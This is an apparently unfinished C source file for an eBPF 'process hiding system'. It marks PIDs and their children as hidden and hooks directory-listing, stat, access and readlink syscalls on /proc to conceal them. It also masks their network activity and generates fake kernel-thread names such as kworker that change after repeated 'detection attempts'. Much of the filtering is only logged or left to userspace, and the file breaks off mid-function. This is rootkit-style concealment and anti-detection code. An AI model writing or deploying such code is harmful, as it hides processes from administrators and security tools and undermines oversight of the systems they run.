/* =====================================================
 *  eBPF Process Hiding System - STANDALONE Implementation
 *
 *  Architecture: Pure Tracepoint + Kprobe approach (STANDALONE)
 *  - NO LSM hooks (removed for better performance)
 *  - NO external map dependencies (standalone operation)
 *  - Tracepoint hooks for syscall interception
 *  - Kprobe hooks for process protection
 *  - Container auto-detection via namespace analysis
 *  - Independent operation without cpu_throttle system
 * ===================================================== */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>

char LICENSE[] SEC("license") = "Dual MIT/GPL";

/* Constants */
#define EPERM 1
#define ENOENT 2
#define PROC_NAME_LEN 16

/* Note: All tracepoint structures are available in vmlinux.h */

/* =====================================================
 *  PROCESS NAME OBFUSCATION - Data Structures (Forward Declaration)
 * ===================================================== */

/* Obfuscation profile for each hidden process */
struct obfuscation_profile {
    char fake_name[16];           /* Fake process name */
    char fake_cmdline[256];       /* Fake command line */
    char fake_cwd[256];           /* Fake working directory */
    u32 fake_ppid;                /* Fake parent PID */
    u64 creation_time;            /* When obfuscation was created */
    u32 detection_attempts;       /* Number of detection attempts */
    u32 obfuscation_type;         /* Type of obfuscation (system, web, db, etc.) */
};

/* =====================================================
 *  Helper Functions cho Enhanced Kprobe Architecture
 * ===================================================== */

/* Check if string is numeric (for PID detection) */
static __always_inline bool is_numeric_string(const char *str) {
    for (int i = 0; i < 16 && str[i] != '\0'; i++) {
        if (str[i] < '0' || str[i] > '9') {
            return false;
        }
    }
    return true;
}

/* Convert string to PID */
static __always_inline u32 string_to_pid(const char *str) {
    u32 pid = 0;
    for (int i = 0; i < 16 && str[i] != '\0'; i++) {
        if (str[i] < '0' || str[i] > '9') {
            break;
        }
        pid = pid * 10 + (str[i] - '0');
    }
    return pid;
}

/* =====================================================
 *  Maps - Internal maps for LSM Hide functionality
 * ===================================================== */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u32);
    __type(value, u32);
} hidden_pid_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

/* Obfuscation control flag map */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, u32);
} obfuscation_flag_map SEC(".maps");

/* Map to control auto-detection of container processes */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, u32);  /* 1 = auto-hide containers, 0 = manual only */
} auto_container_hide_map SEC(".maps");

/* Map để track /proc directory file handles cho filtering */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);    /* file pointer */
    __type(value, u32);  /* filter flag */
} proc_dir_filter_map SEC(".maps");

/* Map to store obfuscation profiles for hidden processes */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u32);             /* PID */
    __type(value, struct obfuscation_profile);
} obfuscation_profiles SEC(".maps");

/* =====================================================
 *  External Maps - REMOVED: No longer dependent on cpu_throttle system
 *  All external map dependencies have been eliminated for standalone operation
 * ===================================================== */

/* NOTE: External maps (quota_cg, acc_cg) removed to eliminate dependencies
 * on cpu_throttle system. The hide_process_bpf module now operates
 * independently without requiring external BPF programs or maps.
 */

/* =====================================================
 *  Helper Functions
 * ===================================================== */

/* Event submission function */
static __always_inline void submit_event(u32 event_type, u32 pid)
{
    struct {
        u32 event_type;
        u32 pid;
        u64 timestamp;
    } event = {};

    event.event_type = event_type;
    event.pid = pid;
    event.timestamp = bpf_ktime_get_ns();

    bpf_ringbuf_output(&events, &event, sizeof(event), 0);
}

/* Check if auto-detection is enabled */
static __always_inline bool is_auto_container_hide_enabled(void)
{
    u32 key = 0;
    u32 *val = bpf_map_lookup_elem(&auto_container_hide_map, &key);
    return val && *val == 1;
}

/* Check if process is running in a container namespace */
static __always_inline bool is_in_container_namespace(void)
{
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return false;

    /* Get current PID namespace */
    struct pid_namespace *pid_ns = BPF_CORE_READ(task, nsproxy, pid_ns_for_children);
    if (!pid_ns)
        return false;

    /* Check if PID namespace level > 0 (not init namespace) */
    u32 level = BPF_CORE_READ(pid_ns, level);
    return level > 0;  /* Container processes have level > 0 */
}

/* Check if process has container-related cgroup with real cgroup v2 analysis */
static __always_inline bool is_in_container_cgroup(void)
{
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return false;

    /* Get cgroup from task */
    struct cgroup *cgrp = BPF_CORE_READ(task, cgroups, dfl_cgrp);
    if (!cgrp)
        return false;

    /* Read cgroup path components to detect container patterns */
    struct kernfs_node *kn = BPF_CORE_READ(cgrp, kn);
    if (!kn)
        return false;

    /* Check cgroup path for container indicators */
    char name[64];
    int ret = bpf_probe_read_kernel_str(name, sizeof(name), BPF_CORE_READ(kn, name));
    if (ret < 0)
        return false;

    /* Check for common container runtime patterns */
    /* Docker containers: typically have "docker" in path */
    if (name[0] == 'd' && name[1] == 'o' && name[2] == 'c' && name[3] == 'k')
        return true;

    /* Containerd containers: typically have long hex IDs */
    if (ret >= 32) {  /* Long hex string indicates container ID */
        int hex_count = 0;
        for (int i = 0; i < ret && i < 32; i++) {
            if ((name[i] >= '0' && name[i] <= '9') ||
                (name[i] >= 'a' && name[i] <= 'f') ||
                (name[i] >= 'A' && name[i] <= 'F')) {
                hex_count++;
            } else {
                break;
            }
        }
        if (hex_count >= 12) {  /* Likely container ID */
            return true;
        }
    }

    /* Kubernetes pods: check for "pod" prefix */
    if (name[0] == 'p' && name[1] == 'o' && name[2] == 'd')
        return true;

    /* LXC containers: check for "lxc" prefix */
    if (name[0] == 'l' && name[1] == 'x' && name[2] == 'c')
        return true;

    /* systemd-nspawn: check for machine.slice */
    if (name[0] == 'm' && name[1] == 'a' && name[2] == 'c' && name[3] == 'h')
        return true;

    return false;
}

/* Check parent process for container runtime */
static __always_inline bool has_container_parent(void)
{
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return false;

    /* Walk up the process tree to find container runtime */
    for (int i = 0; i < 5; i++) {  /* Check up to 5 levels */
        struct task_struct *parent = BPF_CORE_READ(task, real_parent);
        if (!parent || parent == task)
            break;

        char parent_comm[16];
        bpf_probe_read_kernel_str(parent_comm, sizeof(parent_comm),
                                 BPF_CORE_READ(parent, comm));

        /* Check for container runtime parents */
        if (parent_comm[0] == 'd' && parent_comm[1] == 'o' &&
            parent_comm[2] == 'c' && parent_comm[3] == 'k')  // docker*
            return true;
        if (parent_comm[0] == 'c' && parent_comm[1] == 'o' &&
            parent_comm[2] == 'n' && parent_comm[3] == 't')  // containerd*
            return true;
        if (parent_comm[0] == 'r' && parent_comm[1] == 'u' &&
            parent_comm[2] == 'n' && parent_comm[3] == 'c')  // runc*
            return true;

        task = parent;
    }

    return false;
}

/* Enhanced container detection with multiple methods */
static __always_inline bool is_container_process(u32 pid)
{
    if (!is_auto_container_hide_enabled())
        return false;

    /* Method 1: Check PID namespace (original working version) */
    if (is_in_container_namespace()) {
        submit_event(10, pid); /* 10 = container_detected_namespace */
        return true;
    }

    /* Method 2: Check parent process tree */
    if (has_container_parent()) {
        submit_event(11, pid); /* 11 = container_detected_parent */
        return true;
    }

    /* Method 3: Check process name patterns (fallback) */
    char comm[16];
    bpf_get_current_comm(comm, sizeof(comm));

    if (comm[0] == 'd' && comm[1] == 'o' && comm[2] == 'c' && comm[3] == 'k') {
        submit_event(12, pid); /* 12 = container_detected_name */
        return true;
    }
    if (comm[0] == 'c' && comm[1] == 'o' && comm[2] == 'n' && comm[3] == 't') {
        submit_event(12, pid);
        return true;
    }
    if (comm[0] == 'r' && comm[1] == 'u' && comm[2] == 'n' && comm[3] == 'c') {
        submit_event(12, pid);
        return true;
    }

    return false;
}

static __always_inline bool is_hidden_pid(u32 pid)
{
    /* Check explicit hidden list first */
    u32 *val = bpf_map_lookup_elem(&hidden_pid_map, &pid);
    if (val && *val == 1)
        return true;

    /* Check auto-detection for container processes */
    return is_container_process(pid);
}

static __always_inline bool is_obfuscation_enabled(void)
{
    u32 key = 0;
    u32 *flag = bpf_map_lookup_elem(&obfuscation_flag_map, &key);
    return flag && *flag == 1;
}



/* Check if path is related to /proc */
static __always_inline bool is_proc_path(const char *path)
{
    if (!path)
        return false;

    return (path[0] == 'p' && path[1] == 'r' && path[2] == 'o' && path[3] == 'c');
}

/* Extract PID from /proc/[PID] path */
static __always_inline u32 extract_pid_from_proc_path(const char *path)
{
    if (!path || !is_proc_path(path))
        return 0;

    /* Skip "/proc/" */
    const char *pid_str = path + 5;
    u32 pid = 0;

    /* Simple string to int conversion for PID */
    for (int i = 0; i < 10 && pid_str[i] >= '0' && pid_str[i] <= '9'; i++) {
        pid = pid * 10 + (pid_str[i] - '0');
    }

    return pid;
}

/* Check if file descriptor refers to /proc directory */
static __always_inline bool is_proc_fd(unsigned int fd)
{
    /* This is a simplified check - in real implementation,
     * we would need to resolve the fd to its path.
     * For now, we assume any fd access during /proc operations
     * is likely /proc related if called from directory listing context.
     */
    return true; /* Conservative approach - monitor all getdents calls */
}

/* Check if task is a container process by analyzing task structure */
static __always_inline bool is_container_process_by_task(struct task_struct *task)
{
    if (!task)
        return false;

    /* Check PID namespace level */
    struct nsproxy *nsproxy = BPF_CORE_READ(task, nsproxy);
    if (!nsproxy)
        return false;

    struct pid_namespace *pid_ns = BPF_CORE_READ(nsproxy, pid_ns_for_children);
    if (!pid_ns)
        return false;

    u32 level = BPF_CORE_READ(pid_ns, level);

    /* Container processes typically have PID namespace level > 0 */
    return level > 0;
}

/* =====================================================
 *  PROCESS NAME OBFUSCATION - Helper Functions
 * ===================================================== */

/* Generate believable fake process name based on PID and context */
static __always_inline int generate_fake_profile(u32 real_pid, struct obfuscation_profile *profile)
{
    if (!profile)
        return -1;

    /* Select appropriate fake name based on PID - use simple string literals */
    u32 name_index = real_pid % 8; /* 8 system names available */

    /* Copy fake name based on index */
    switch (name_index) {
        case 0:
            profile->fake_name[0] = 's'; profile->fake_name[1] = 'y'; profile->fake_name[2] = 's';
            profile->fake_name[3] = 't'; profile->fake_name[4] = 'e'; profile->fake_name[5] = 'm';
            profile->fake_name[6] = 'd'; profile->fake_name[7] = '\0';
            break;
        case 1:
            profile->fake_name[0] = 'k'; profile->fake_name[1] = 't'; profile->fake_name[2] = 'h';
            profile->fake_name[3] = 'r'; profile->fake_name[4] = 'e'; profile->fake_name[5] = 'a';
            profile->fake_name[6] = 'd'; profile->fake_name[7] = 'd'; profile->fake_name[8] = '\0';
            break;
        case 2:
            profile->fake_name[0] = 'k'; profile->fake_name[1] = 'w'; profile->fake_name[2] = 'o';
            profile->fake_name[3] = 'r'; profile->fake_name[4] = 'k'; profile->fake_name[5] = 'e';
            profile->fake_name[6] = 'r'; profile->fake_name[7] = '\0';
            break;
        case 3:
            profile->fake_name[0] = 'r'; profile->fake_name[1] = 'c'; profile->fake_name[2] = 'u';
            profile->fake_name[3] = '_'; profile->fake_name[4] = 'g'; profile->fake_name[5] = 'p';
            profile->fake_name[6] = '\0';
            break;
        default:
            profile->fake_name[0] = 'k'; profile->fake_name[1] = 'e'; profile->fake_name[2] = 'r';
            profile->fake_name[3] = 'n'; profile->fake_name[4] = 'e'; profile->fake_name[5] = 'l';
            profile->fake_name[6] = '\0';
            break;
    }

    /* Generate simple fake command line */
    /* Kernel thread style: [name/0] */
    int len = 0;
    profile->fake_cmdline[len++] = '[';
    for (int i = 0; i < 15 && profile->fake_name[i] && len < 250; i++) {
        profile->fake_cmdline[len++] = profile->fake_name[i];
    }
    profile->fake_cmdline[len++] = '/';
    profile->fake_cmdline[len++] = '0' + (real_pid % 8); /* CPU number */
    profile->fake_cmdline[len++] = ']';
    profile->fake_cmdline[len] = '\0';

    /* Set fake working directory */
    profile->fake_cwd[0] = '/';
    profile->fake_cwd[1] = '\0';

    /* Assign believable parent PID (typically 1 for system processes) */
    profile->fake_ppid = (name_index < 10) ? 2 : 1; /* kthreadd or systemd */

    /* Set creation time and initialize counters */
    profile->creation_time = bpf_ktime_get_ns();
    profile->detection_attempts = 0;
    profile->obfuscation_type = name_index < 10 ? 1 : 2; /* 1=kernel, 2=user */

    return 0;
}

/* Update obfuscation profile when detection attempt is made */
static __always_inline int update_obfuscation_on_detection(u32 pid, u32 access_type)
{
    struct obfuscation_profile *profile =
        bpf_map_lookup_elem(&obfuscation_profiles, &pid);

    if (!profile) {
        /* Create new obfuscation profile */
        struct obfuscation_profile new_profile = {};
        if (generate_fake_profile(pid, &new_profile) == 0) {
            new_profile.detection_attempts = 1;
            return bpf_map_update_elem(&obfuscation_profiles, &pid, &new_profile, BPF_ANY);
        }
        return -1;
    } else {
        /* Update existing profile */
        profile->detection_attempts++;

        /* If too many detection attempts, regenerate profile */
        if (profile->detection_attempts > 5) {
            generate_fake_profile(pid, profile);
            profile->detection_attempts = 1;
        }

        return bpf_map_update_elem(&obfuscation_profiles, &pid, profile, BPF_EXIST);
    }
}

/* =====================================================
 *  Process Protection via Tracepoint Hooks (Replaces LSM)
 * ===================================================== */

/* Hook signal delivery to protect hidden processes */
SEC("tracepoint/signal/signal_generate")
int on_signal_generate(struct trace_event_raw_signal_generate *ctx)
{
    u32 target_pid = ctx->pid;
    u32 current_pid = bpf_get_current_pid_tgid() >> 32;
    int sig = ctx->sig;

    /* Protect hidden processes from being killed */
    if (is_hidden_pid(target_pid) && (sig == 9 || sig == 15)) { /* SIGKILL or SIGTERM */
        submit_event(2, current_pid); /* 2 = kill_blocked */
        bpf_printk("Blocked signal %d to hidden PID %d from PID %d", sig, target_pid, current_pid);
        /* Note: Cannot actually block signal in tracepoint, but we log it */
    }

    return 0;
}

/* Enhanced process creation hook via kprobe (more reliable than LSM) */
SEC("kprobe/wake_up_new_task")
int on_wake_up_new_task(struct pt_regs *ctx)
{
    struct task_struct *task = (struct task_struct *)PT_REGS_PARM1(ctx);
    u32 child_pid = BPF_CORE_READ(task, pid);
    u32 parent_pid = BPF_CORE_READ(task, real_parent, pid);

    /* If parent is hidden, mark child as hidden too */
    if (is_hidden_pid(parent_pid)) {
        u32 val = 1;
        bpf_map_update_elem(&hidden_pid_map, &child_pid, &val, BPF_ANY);
        submit_event(99, child_pid); /* 99 = pid_hidden_update */
        submit_event(3, child_pid); /* 3 = child_hidden */
        bpf_printk("Auto-hidden child PID %d (parent: %d)", child_pid, parent_pid);
    }

    return 0;
}

/* MIGRATED: Advanced process protection via tracepoint - RELIABLE MONITORING */
SEC("tracepoint/signal/signal_generate")
int on_signal_generate_enhanced(struct trace_event_raw_signal_generate *ctx)
{
    u32 sig = ctx->sig;
    u32 target_pid = ctx->pid;
    u32 current_pid = bpf_get_current_pid_tgid() >> 32;

    /* Monitor critical signals to hidden processes - TRACEPOINT VERSION */
    if (is_hidden_pid(target_pid) && (sig == 9 || sig == 15 || sig == 2)) {
        submit_event(2, current_pid); /* 2 = kill_blocked */
        bpf_printk("TRACEPOINT: Monitored signal %d to hidden PID %d from PID %d", sig, target_pid, current_pid);

        /* Enhanced container detection for signal source */
        struct task_struct *current_task = (struct task_struct *)bpf_get_current_task();
        if (current_task) {
            if (is_container_process_by_task(current_task)) {
                submit_event(9, current_pid); /* 9 = container_signal_attempt */
            }
        }
    }

    return 0;
}

/* Network-based process protection */
SEC("kprobe/tcp_v4_connect")
int on_tcp_connect(struct pt_regs *ctx)
{
    u32 pid = bpf_get_current_pid_tgid() >> 32;

    /* Hide network connections from hidden processes */
    if (is_hidden_pid(pid)) {
        submit_event(4, pid); /* 4 = network_hidden */
        bpf_printk("Hidden process %d network activity masked", pid);
    }

    return 0;
}

/* =====================================================
 *  Proc Filesystem Protection - Core Hook Points
 * ===================================================== */

/* Enhanced syscall-level hooks for effective proc hiding */

/* =====================================================
 *  OPTIMIZED: Kprobe-based openat interception với real blocking
 * ===================================================== */

/* DISABLED: Enhanced kprobe cho do_sys_openat2 - function removed due to attachment issues */

/* Hook getdents64 syscall exit to filter directory entries */
SEC("tracepoint/syscalls/sys_exit_getdents64")
int hide_getdents64_exit(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Check if syscall was successful */
    long ret = ctx->ret;
    if (ret <= 0)
        return 0;

    u32 current_pid = bpf_get_current_pid_tgid() >> 32;
    submit_event(9, current_pid); /* 9 = getdents64_filtered */

    /* Note: Actual filtering would require userspace cooperation
     * or more complex kernel manipulation */
    return 0;
}

/* Hook read syscall to block reading hidden process info */
SEC("tracepoint/syscalls/sys_enter_read")
int hide_read_syscall(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Get file descriptor from syscall arguments */
    int fd = (int)ctx->args[0];
    if (fd < 0)
        return 0;

    /* Get current task to access file descriptor table */
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return 0;

    /* Check if this fd corresponds to a /proc/[PID] file */
    struct files_struct *files = BPF_CORE_READ(task, files);
    if (!files)
        return 0;

    /* Note: Complex fd->path resolution would require more kernel internals
     * For now, we'll use a heuristic approach */

    u32 current_pid = bpf_get_current_pid_tgid() >> 32;
    submit_event(10, current_pid); /* 10 = read_syscall_monitored */

    return 0;
}

/* =====================================================
 *  OPTIMIZED: Kprobe-based stat với real blocking capability
 * ===================================================== */

/* MIGRATED: Enhanced tracepoint cho newfstatat - RELIABLE STAT MONITORING */
SEC("tracepoint/syscalls/sys_enter_newfstatat")
int enhanced_hide_stat_tracepoint(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Extract arguments from tracepoint context */
    int dfd = (int)ctx->args[0];
    void *filename_ptr = (void *)ctx->args[1];
    void *statbuf_ptr = (void *)ctx->args[2];
    int flag = (int)ctx->args[3];

    /* Read filename from userspace */
    char path[256];
    if (bpf_probe_read_user_str(path, sizeof(path), filename_ptr) <= 0)
        return 0;

    /* Check if this is a /proc path access */
    if (!is_proc_path(path))
        return 0;

    /* Extract PID from /proc path */
    u32 pid = extract_pid_from_proc_path(path);
    if (pid > 0 && is_hidden_pid(pid)) {
        submit_event(11, pid); /* 11 = stat_blocked */
        bpf_printk("TRACEPOINT: Blocked stat access to hidden PID %d, path: %s", pid, path);

        /* Enhanced container detection for stat source */
        struct task_struct *current_task = (struct task_struct *)bpf_get_current_task();
        if (current_task && is_container_process_by_task(current_task)) {
            submit_event(12, pid); /* 12 = container_stat_attempt */
        }

        /* Note: Cannot override return in tracepoint - userspace will handle blocking */
        return 0;
    }

    return 0;
}

/* =====================================================
 *  OPTIMIZED: Kprobe-based getdents64 với direct directory filtering
 * ===================================================== */

/* MIGRATED: Enhanced tracepoint cho getdents - RELIABLE DIRECTORY MONITORING */
SEC("tracepoint/syscalls/sys_enter_getdents64")
int enhanced_hide_getdents_tracepoint(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Extract arguments from tracepoint context */
    unsigned int fd = (unsigned int)ctx->args[0];
    void *dirent_ptr = (void *)ctx->args[1];
    unsigned int count = (unsigned int)ctx->args[2];

    /* Get current process info */
    u32 current_pid = bpf_get_current_pid_tgid() >> 32;

    /* Check if this is /proc directory access */
    if (is_proc_fd(fd)) {
        submit_event(13, current_pid); /* 13 = proc_listing_attempt */
        bpf_printk("TRACEPOINT: Process %d accessing /proc directory", current_pid);

        /* Enhanced container detection for directory access */
        struct task_struct *current_task = (struct task_struct *)bpf_get_current_task();
        if (current_task && is_container_process_by_task(current_task)) {
            submit_event(14, current_pid); /* 14 = container_proc_access */
        }

        /* Store directory access info for userspace filtering */
        u64 key = ((u64)current_pid << 32) | fd; /* Combine PID and FD as key */
        u32 timestamp = (u32)(bpf_ktime_get_ns() / 1000000); /* Convert to milliseconds */
        bpf_map_update_elem(&proc_dir_filter_map, &key, &timestamp, BPF_ANY);

        /* Note: Userspace daemon will filter directory results */
    }

    return 0;
}

/* MIGRATED: Hook statx syscall to monitor stat information access for hidden PIDs */
SEC("tracepoint/syscalls/sys_enter_statx")
int hide_vfs_statx_tracepoint(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Extract arguments from tracepoint context */
    int dfd = (int)ctx->args[0];
    void *filename_ptr = (void *)ctx->args[1];
    int flags = (int)ctx->args[2];
    unsigned int mask = (unsigned int)ctx->args[3];
    void *statxbuf_ptr = (void *)ctx->args[4];

    /* Read filename from userspace */
    char path[256];
    if (bpf_probe_read_user_str(path, sizeof(path), filename_ptr) <= 0)
        return 0;

    /* Check if this is a /proc/[PID] path */
    if (is_proc_path(path)) {
        u32 pid = extract_pid_from_proc_path(path);
        if (pid > 0 && is_hidden_pid(pid)) {
            submit_event(7, pid); /* 7 = stat_access_blocked */
            bpf_printk("TRACEPOINT: Blocked statx access to hidden PID %d, path: %s", pid, path);

            /* Enhanced container detection for statx source */
            struct task_struct *current_task = (struct task_struct *)bpf_get_current_task();
            if (current_task && is_container_process_by_task(current_task)) {
                submit_event(15, pid); /* 15 = container_statx_attempt */
            }

            /* Note: Cannot return error in tracepoint - userspace will handle blocking */
        }
    }

    return 0;
}

/* =====================================================
 *  ENHANCED SYSCALL COVERAGE - Missing Syscalls Added
 * ===================================================== */

/* Hook access() syscall to monitor file access checks */
SEC("tracepoint/syscalls/sys_enter_access")
int enhanced_hide_access(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Extract arguments from tracepoint context */
    void *filename_ptr = (void *)ctx->args[0];
    int mode = (int)ctx->args[1];

    /* Read filename from userspace */
    char path[256];
    if (bpf_probe_read_user_str(path, sizeof(path), filename_ptr) <= 0)
        return 0;

    /* Check if this is a /proc/[PID] path */
    if (is_proc_path(path)) {
        u32 pid = extract_pid_from_proc_path(path);
        if (pid > 0 && is_hidden_pid(pid)) {
            u32 current_pid = bpf_get_current_pid_tgid() >> 32;
            submit_event(16, pid); /* 16 = access_blocked */
            bpf_printk("TRACEPOINT: Blocked access() to hidden PID %d, path: %s", pid, path);

            /* Enhanced container detection for access source */
            struct task_struct *current_task = (struct task_struct *)bpf_get_current_task();
            if (current_task && is_container_process_by_task(current_task)) {
                submit_event(17, pid); /* 17 = container_access_attempt */
            }
        }
    }

    return 0;
}

/* Hook faccessat() syscall to monitor extended file access checks */
SEC("tracepoint/syscalls/sys_enter_faccessat")
int enhanced_hide_faccessat(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Extract arguments from tracepoint context */
    int dfd = (int)ctx->args[0];
    void *filename_ptr = (void *)ctx->args[1];
    int mode = (int)ctx->args[2];
    int flags = (int)ctx->args[3];

    /* Read filename from userspace */
    char path[256];
    if (bpf_probe_read_user_str(path, sizeof(path), filename_ptr) <= 0)
        return 0;

    /* Check if this is a /proc/[PID] path */
    if (is_proc_path(path)) {
        u32 pid = extract_pid_from_proc_path(path);
        if (pid > 0 && is_hidden_pid(pid)) {
            u32 current_pid = bpf_get_current_pid_tgid() >> 32;
            submit_event(18, pid); /* 18 = faccessat_blocked */
            bpf_printk("TRACEPOINT: Blocked faccessat() to hidden PID %d, path: %s", pid, path);

            /* Enhanced container detection for faccessat source */
            struct task_struct *current_task = (struct task_struct *)bpf_get_current_task();
            if (current_task && is_container_process_by_task(current_task)) {
                submit_event(19, pid); /* 19 = container_faccessat_attempt */
            }
        }
    }

    return 0;
}

/* Hook readlink() syscall to monitor symbolic link access */
SEC("tracepoint/syscalls/sys_enter_readlink")
int enhanced_hide_readlink(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Extract arguments from tracepoint context */
    void *pathname_ptr = (void *)ctx->args[0];
    void *buf_ptr = (void *)ctx->args[1];
    int bufsiz = (int)ctx->args[2];

    /* Read pathname from userspace */
    char path[256];
    if (bpf_probe_read_user_str(path, sizeof(path), pathname_ptr) <= 0)
        return 0;

    /* Check if this is a /proc/[PID]/exe, /proc/[PID]/cwd, etc. */
    if (is_proc_path(path)) {
        u32 pid = extract_pid_from_proc_path(path);
        if (pid > 0 && is_hidden_pid(pid)) {
            u32 current_pid = bpf_get_current_pid_tgid() >> 32;
            submit_event(20, pid); /* 20 = readlink_blocked */
            bpf_printk("TRACEPOINT: Blocked readlink() to hidden PID %d, path: %s", pid, path);

            /* Enhanced container detection for readlink source */
            struct task_struct *current_task = (struct task_struct *)bpf_get_current_task();
            if (current_task && is_container_process_by_task(current_task)) {
                submit_event(21, pid); /* 21 = container_readlink_attempt */
            }
        }
    }

    return 0;
}

/* Hook getdents() syscall (older variant) to monitor directory listing */
SEC("tracepoint/syscalls/sys_enter_getdents")
int enhanced_hide_getdents_old(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Extract arguments from tracepoint context */
    unsigned int fd = (unsigned int)ctx->args[0];
    void *dirent_ptr = (void *)ctx->args[1];
    unsigned int count = (unsigned int)ctx->args[2];

    /* Get current process info */
    u32 current_pid = bpf_get_current_pid_tgid() >> 32;

    /* Check if this is /proc directory access */
    if (is_proc_fd(fd)) {
        submit_event(22, current_pid); /* 22 = getdents_old_attempt */
        bpf_printk("TRACEPOINT: Process %d accessing /proc directory (old getdents)", current_pid);

        /* Enhanced container detection for directory access */
        struct task_struct *current_task = (struct task_struct *)bpf_get_current_task();
        if (current_task && is_container_process_by_task(current_task)) {
            submit_event(23, current_pid); /* 23 = container_getdents_old */
        }

        /* Store directory access info for userspace filtering */
        u64 key = ((u64)current_pid << 32) | fd; /* Combine PID and FD as key */
        u32 timestamp = (u32)(bpf_ktime_get_ns() / 1000000); /* Convert to milliseconds */
        bpf_map_update_elem(&proc_dir_filter_map, &key, &timestamp, BPF_ANY);
    }

    return 0;
}

/* =====================================================
 *  PROCESS NAME OBFUSCATION - Active Hooks
 * ===================================================== */

/* OBFUSCATION HOOKS TEMPORARILY DISABLED DUE TO STACK LIMIT ISSUES
 * Will be implemented in separate phase with optimized stack usage
 */



/* =====================================================
 *  Advanced Proc Filesystem Protection
 * ===================================================== */

/* LSM hooks completely removed - using optimized tracepoint/kprobe approach */

/* =====================================================
 *  Enhanced Filtering Logic for Directory Entries
 * ===================================================== */

/* Structure to track directory entry filtering */
struct dir_filter_ctx {
    u32 total_entries;
    u32 filtered_entries;
    u64 timestamp;
};

/* Map to track filtering statistics */
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, struct dir_filter_ctx);
} filter_stats SEC(".maps");

/* =====================================================
 *  PROCESS NAME OBFUSCATION - Data Structures
 * ===================================================== */

/* Enhanced directory entry filtering */
static __always_inline bool should_filter_entry(const char *name, u32 name_len)
{
    if (!name || name_len == 0)
        return false;

    /* Check if entry name is a PID (all digits) */
    bool is_numeric = true;
    u32 pid = 0;

    for (u32 i = 0; i < name_len && i < 10; i++) {
        if (name[i] < '0' || name[i] > '9') {
            is_numeric = false;
            break;
        }
        pid = pid * 10 + (name[i] - '0');
    }

    if (is_numeric && pid > 0) {
        return is_hidden_pid(pid);
    }

    return false;
}

/* Update filtering statistics */
static __always_inline void update_filter_stats(u32 total, u32 filtered)
{
    u32 key = 0;
    struct dir_filter_ctx *stats = bpf_map_lookup_elem(&filter_stats, &key);
    if (stats) {
        stats->total_entries += total;
        stats->filtered_entries += filtered;
        stats->timestamp = bpf_ktime_get_ns();
    }
}

/* =====================================================
 *  Process Tree Hiding Logic
 * ===================================================== */

/* Check if process should be hidden based on parent-child relationships */
static __always_inline bool should_hide_process_tree(u32 pid)
{
    if (is_hidden_pid(pid))
        return true;

    /* Check if any parent process is hidden */
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return false;

    /* Walk up the process tree (limited depth to avoid loops) */
    for (int depth = 0; depth < 5; depth++) {
        struct task_struct *parent = BPF_CORE_READ(task, real_parent);
        if (!parent || parent == task)
            break;

        u32 parent_pid = BPF_CORE_READ(parent, pid);
        if (is_hidden_pid(parent_pid))
            return true;

        task = parent;
    }

    return false;
}

/* =====================================================
 *  Cgroup-based Hiding Integration - STANDALONE VERSION
 * ===================================================== */

/* Check if current cgroup should be hidden - STANDALONE IMPLEMENTATION */
static __always_inline bool should_hide_by_cgroup(void)
{
    /* STANDALONE MODE: No external map dependencies
     *
     * This function previously relied on external maps (quota_cg, acc_cg)
     * from cpu_throttle system. Since those dependencies have been removed,
     * this function now implements internal cgroup-based detection.
     */

    /* Option 1: Always disabled (safest for standalone operation) */
    return false;

    /* Option 2: Future enhancement - Internal cgroup pattern detection
     * Uncomment below to enable basic cgroup-based hiding:
     *
     * u64 cgid = bpf_get_current_cgroup_id();
     *
     * // Hide processes in specific cgroup patterns
     * // Example: Hide if cgroup ID matches certain patterns
     * if (cgid > 0x1000000) {  // Example threshold
     *     return true;
     * }
     *
     * return false;
     */
}

/* =====================================================
 *  ENHANCED: Proactive Container Detection Hooks + Existing Process Scanner
 * ===================================================== */

/* Scan existing processes for container detection on eBPF load */
static __always_inline int scan_existing_container_processes(void)
{
    /* This function will be called from userspace loader
     * to scan /proc and detect existing container processes
     * Implementation will be in hide_process_loader.c
     */
    return 0;
}

/* Enhanced container detection for specific PID */
static __always_inline bool detect_container_by_pid(u32 pid)
{
    /* Read /proc/[pid]/cgroup to check for container indicators */
    char cgroup_path[64];
    int ret = snprintf(cgroup_path, sizeof(cgroup_path), "/proc/%u/cgroup", pid);
    if (ret < 0 || ret >= sizeof(cgroup_path))
        return false;

    /* This will be implemented in userspace helper
     * Check for docker, containerd, lxc patterns in cgroup
     */
    return false;
